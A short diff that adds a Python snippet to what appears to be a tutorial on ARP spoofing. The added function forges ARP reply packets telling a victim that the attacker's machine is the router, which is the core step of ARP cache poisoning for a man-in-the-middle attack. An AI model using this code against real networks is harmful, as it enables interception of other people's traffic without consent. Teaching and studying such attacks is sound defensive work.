@@ -19,3 +19,8 @@ The victim (who is not the victim yet) sends an ARP broadcast to ask what are th
 ## How the Code Works
 
 Remember, we need to tell the victim that we're the router, so we'll create a packet doing just that. 
+```python
+def spoofarpcache(targetip, targetmac, sourceip):
+    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
+    send(spoofed, verbose= False)
+```
